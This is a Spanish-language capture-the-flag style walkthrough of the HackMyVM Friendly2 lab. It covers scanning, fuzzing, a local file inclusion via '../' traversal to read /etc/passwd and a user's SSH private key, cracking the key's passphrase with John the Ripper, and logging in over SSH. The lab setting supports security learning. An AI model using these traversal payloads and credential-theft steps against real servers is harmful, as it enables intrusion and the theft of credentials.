# Explotación Vulnerabilidad Local File Inclusion (LFI)

Maquinas a utilizar **Kali Linux y  Friendly2** [https://hackmyvm.eu/machines/machine.php?vm=Friendly2](https://hackmyvm.eu/machines/machine.php?vm=Friendly2)

Intentaremos explotar la de forma básica la **vulnerabilidad local file inclusion**, la cual se trata de una vulnerabilidad que nos permite acceder a archivos internos de la máquina víctima; y así obtener información privilegiada que nos sirva para realizar otros ataques.

En esta ocasión, vamos a tratar de acceder al archivo id_rsa del usuario existente en el sistema para conseguir entrar vía ssh sin proporcionar ninguna contraseña.

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%20186.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.16 -oN escaneo
```

![image.png](./imagenes/image%20187.png)

- Nos vamos al navegador web y copiamos la IP de la maquina victima.
    
    ![image.png](./imagenes/image%20188.png)
    

- Hacemos **Fuzzing Web,** y voy a utilizar **dirb** para hacerlo de una manera rápida.
    
    ```bash
    dirb [http://10.0.3.16/](./imagenes/http://10.0.3.16/) 
    ```
    
    ![image.png](./imagenes/image%20189.png)
    

- Miramos el directorio tools en el navegador.
    
    ![image.png](./imagenes/image%20190.png)
    

- Pulsamos `CTRL+U` para revisar el código de la pagina web.
    
    ![image.png](./imagenes/image%20191.png)
    
    Nos fijamos en un comentario que hace referencia a una URL. **`check_if_exist.php?doc=keyboard.html`**
    
    Vamos a probarla:
    
    ![image.png](./imagenes/image%20192.png)
    

<aside>
💡

Una vulnerabilidad de Local File Inclusion (LFI) en una página web se produce cuando una aplicación permite a un atacante incluir archivos locales del servidor para ejecutarlos o leer su contenido. Esto sucede debido a una validación deficiente o inexistente en los parámetros que controla el usuario. 

</aside>

Debemos empezar a pensar en esta posible vulnerabilidad cuando dentro de la URL estemos viendo algo parecido a esto `?doc=keyboard.html` donde la **URL esta llamando a un archivo**. Esta vulnerabilidad consiste en que yo pueda retroceder por los directorios de tal forma de que yo pueda estar apuntando hacia un archivo interno de la maquina victima. **Esto podría ser muy grabe** ya que podría **estar apuntando sobre archivos que contengan información sensible.**

- ¿Cómo puedo retroceder por los directorios?
    - Teniendo esta URL :
        
        `http://10.0.3.16/tools/check_if_exist.php?doc=keyboard.html`
        
    - Borramos el `keyboard.html` y lo sustituimos por `../` (esto viene de que en Linux para retroceder  en los directorios ponemos `cd ..` ) por tanto vamos a poner muchos  ../ sin limite ya que lo que queremos es llegar a la raíz y es mejor poner de mas que quedarnos cortos. Cuando se suele probar esto se suele intentar apuntar hacia un archivo llamado **passwd** que es un archivo donde se encuentran los usuarios registrados de la maquina Linux.
        
        `http://10.0.3.16/tools/check_if_exist.php?doc=../../../../../../etc/passwd`
        
        ![image.png](./imagenes/image%20193.png)
        
        Pero cunado se intenta hacer un **File Inclusion** lo interesante es entrar dentro de la maquina. ¿Cómo podríamos convertir esto en una intrusión en el servidor?.
        
        Vamos a hacerlo de una manera simple, intentando apuntar contra el fichero **id_rsa de un usuario existente.** Si consigo obtenerlo dentro de mi maquina local podría entrar vía SSH sin introducir contraseñas.
        
        <aside>
        💡
        
        Un archivo **id_rsa** es la clave privada de un par de claves RSA que se utiliza para la autenticación segura en conexiones SSH.
        
        </aside>
        
        ![image.png](./imagenes/image%20194.png)
        
        Podemos ver que tenemos un usuario antecedido de **home** es que el usuario existe. **/home/gh0st** .
        
        El fichero **id_rsa** se encuentra por defecto dentro de **/home/nombre_ususario/.ssh/**
        
        Por tanto la ruta que deberíamos poner nos quedaría así: **10.0.3.16/tools/check_if_exist.php?doc=../../../../../../home/gh0st/.ssh/id_rsa**
        
        ![image.png](./imagenes/image%20195.png)
        
- Pulsamos **CTRL+U** para verlo mejor
    
    ![image.png](./imagenes/image%20196.png)
    
- Nos copiamos el contenido.
- abrimos un terminal y creamos un fichero llamado id_rsa con nano
    
    ```bash
    nano id_rsa
    ```
    
    ![image.png](./imagenes/image%20197.png)
    
    ![image.png](./imagenes/image%20198.png)
    

- Establecemos los permisos del archivo id_rsa para que solo el propietario pueda leer y escribir en él.
    
    ```bash
    chmod 600 id_rsa
    ```
    
    ![image.png](./imagenes/image%20199.png)
    
- Vamos loguearnos por ssh
    
    ```bash
    ssh -i id_rsa gh0st@10.0.3.16
    ```
    
    ![image.png](./imagenes/image%20200.png)
    
    **`i id_rsa`**: Especifica el archivo de clave privada (`id_rsa`) que se utilizará para la autenticación.
    
    **`gh0st`**: Es el nombre de usuario en el servidor remoto.
    
    **`10.0.3.16`**: Es la dirección IP del servidor remoto.
    
    **Nos pide una contraseña 😲😲**
    
    <aside>
    💡
    
    **"Enter passphrase for key 'id_rsa'"** indica que la clave privada `id_rsa` está protegida con una frase de contraseña. Esta frase de contraseña es una capa adicional de seguridad que cifra la clave privada en tu sistema. Para usar la clave, debes ingresar la frase de contraseña que configuraste al generarla.
    
    Esto asegura que, incluso si alguien obtiene acceso al archivo `id_rsa`, no podrá usarlo sin conocer la frase de contraseña.
    
    </aside>
    

- Vamos a **Crakear** la contraseña de **id_rsa** usando **John the Ripper** y su utilidad **ssh2john.**
    
    ```bash
    ssh2john id_rsa > hash 
    ```
    
    ![image.png](./imagenes/image%20201.png)
    
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash 
    ```
    
    ![image.png](./imagenes/image%20202.png)
    

- Volvemos a  loguearnos por ssh
    
    ```bash
    ssh -i id_rsa gh0st@10.0.3.16
    ```
    
    ![image.png](./imagenes/image%20203.png)